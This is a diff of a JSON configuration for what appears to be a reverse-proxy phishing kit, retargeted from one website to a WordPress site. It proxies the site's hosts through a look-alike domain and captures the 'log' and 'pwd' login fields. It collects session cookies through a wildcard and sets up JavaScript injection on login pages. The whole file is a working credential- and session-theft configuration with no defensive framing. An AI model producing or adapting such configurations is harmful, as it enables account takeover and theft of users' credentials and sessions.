@@ -1,51 +1,30 @@
 {
-  "name": "fluxxset.com",
-  "author": "fluxxset",
+  "name": "rullout.com",
+  "author": "Rullout",
   "min_version": "1.0.0",
-  "target_url": "https://fluxxset.com",
-  "redirect_url": "https://fluxxset.com",
+  "target_url": "https://rullout.com",
+  "redirect_url": "https://rullout.com",
   "proxy_domain": "xx.in",
   "proxy_auth": "/xxx/ekfbsejhbesjhfgive",
   "hosts_to_proxy": [
     {
-      "host": "fluxxset.com",
+      "host": "rullout.com",
       "orignal_subdomain": "",
       "proxy_subdomain": "",
       "reverce_filter": true,
       "auto_filter": true
     },
     {
-      "host": "www.fluxxset.com",
+      "host": "www.rullout.com",
       "orignal_subdomain": "www",
       "proxy_subdomain": "www",
       "reverce_filter": true,
       "auto_filter": true
     },
     {
-      "host": "tools.fluxxset.com",
-      "orignal_subdomain": "tools",
+      "host": "buck.rullout.com",
+      "orignal_subdomain": "buck",
       "proxy_subdomain": "test",
-      "reverce_filter": true,
-      "auto_filter": true
-    },
-    {
-      "host": "shop.fluxxset.com",
-      "orignal_subdomain": "shop",
-      "proxy_subdomain": "ss",
-      "reverce_filter": true,
-      "auto_filter": true
-    },
-    {
-      "host": "duckduckgo.com",
-      "orignal_subdomain": "",
-      "proxy_subdomain": "xxtt",
-      "reverce_filter": true,
-      "auto_filter": true
-    },
-    {
-      "host": "links.duckduckgo.com",
-      "orignal_subdomain": "links",
-      "proxy_subdomain": "slink",
       "reverce_filter": true,
       "auto_filter": true
     }
@@ -53,61 +32,54 @@
   "filters": [
     {
       "type": "url",
-      "url": "/login",
+      "url": "/xmylog",
       "method": "GET",
-      "locate": "fluxxset.com",
+      "locate": "rullout.com",
       "replace": "xx.in"
     },
     {
       "type": "url",
       "url": "*",
       "method": "GET",
-      "locate": "FluxxSet",
+      "locate": "Rullout",
       "replace": "Changed"
     }
   ],
   "auth_urls": [
-    "/session",
-    "/register"
+    "/xmylog",
+    "/wp-admin"
   ],
   "credentials": [
+   
     {
-      "type": "json",
-      "name": "username",
-      "keyword": "login",
-      "regexp": "true",
-      "regexp_string": "login"
-    },
-    {
-      "type": "json",
-      "name": "username",
-      "keyword": "login",
-      "regexp": "true",
-      "regexp_string": "login\":\\s*\"([^\"]*)\""
+      "type": "post",
+      "name": "log",
+      "keyword": "log",
+      "regexp": "false"
     },
     {
       "type": "post",
-      "name": "password",
-      "keyword": "password",
+      "name": "pwd",
+      "keyword": "pwd",
       "regexp": "false"
     }
   ],
   "cookies": [
-    "sessionid",
-    "csrftoken",
+    "panoramaId",
+    "fpestid",
     "*"
   ],
   "inject_js": [
     {
-      "host": "fluxxset.com",
-      "url": "/login",
+      "host": "rullout.com",
+      "url": "/xmylog",
       "js_code": "console.log('Hello, world!');"
     },
     {
-      "host": "www.fluxxset.com",
-      "url": "/login",
+      "host": "www.rullout.com",
+      "url": "/",
       "js_code": "console.log('Hello, world!');"
     }
   ],
-  "landing_url": "/login"
+  "landing_url": "/xmylog"
 }
